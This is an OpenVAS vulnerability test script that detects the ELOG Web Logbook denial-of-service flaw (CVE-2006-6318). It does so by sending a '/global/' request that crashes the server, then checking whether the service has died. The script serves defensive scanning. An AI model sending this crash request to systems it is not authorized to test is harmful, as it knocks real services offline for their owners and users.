# OpenVAS Vulnerability Test
# $Id: elog_logbook_global_dos.nasl 16 2013-10-27 13:09:52Z jan $
# Description: ELOG Web LogBook global Denial of Service
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2006 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_solution = "Upgrade to ELOG version 2.6.2-7 or later.

CVSS Base Score : 5.0 (AV:N/AC:L/Au:N/C:N/I:N/A:P)";

tag_summary = "The remote web server is affected by a denial of service issue. 

Description :

The remote web server is identified as ELOG Web Logbook, an open
source blogging software. 

The version of ELOG Web Logbook installed on the remote host is
vulnerable to a denial of service attack by requesting '/global' or
any logbook with 'global' in its name.  When a request like this is
received, a NULL pointer dereference occurs, leading to a crash of the
service.";


if(description) {
	script_id(80056);;
	script_version("$Revision: 16 $");
	script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
	script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");

	script_cve_id("CVE-2006-6318");
	script_bugtraq_id(21028);
	script_xref(name:"OSVDB", value:"30272");

	name = "ELOG Web LogBook global Denial of Service";
	summary = "Tries to crash the remote service.";
	family = "Web application abuses";

	script_name(name);
desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
	script_description(desc);
	script_summary(summary);

	script_category(ACT_DENIAL);
	script_copyright("This script is Copyright (C) 2006 Justin Seitz");

	script_family(family);

	script_dependencies("http_version.nasl");
	script_require_ports("Services/www", 8080);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
   script_tag(name : "solution" , value : tag_solution);
 }
 script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/fulldisclosure/2006-11/0198.html");
 script_xref(name : "URL" , value : "http://savannah.psi.ch/websvn/log.php?repname=elog&amp;path=/trunk/&amp;rev=1749&amp;sc=1&amp;isdir=1");
 script_xref(name : "URL" , value : "http://midas.psi.ch/elogs/Forum/2053");
	exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

#
#
#	Verify we can talk to the web server either on port 8080 (the default).
#
#

port = get_http_port(default:8080);
if(!get_port_state(port)) exit(0);
if (http_is_dead(port:port)) exit(0);

#
#
#	Verify its ELOG and send the DOS if it is.
#
#

banner = get_http_banner(port:port);
if (!isnull(banner) && "Server: ELOG HTTP" >< banner) {

	uri = "/global/";
	attackreq = http_get(port:port, item:uri);
	attackres = http_send_recv(port:port, data:attackreq);

	#
	#
	#	Try to connect to the web server, if you can't you know its busted.
	#
	#

	if(http_is_dead(port:port))
		security_warning(port);	
}
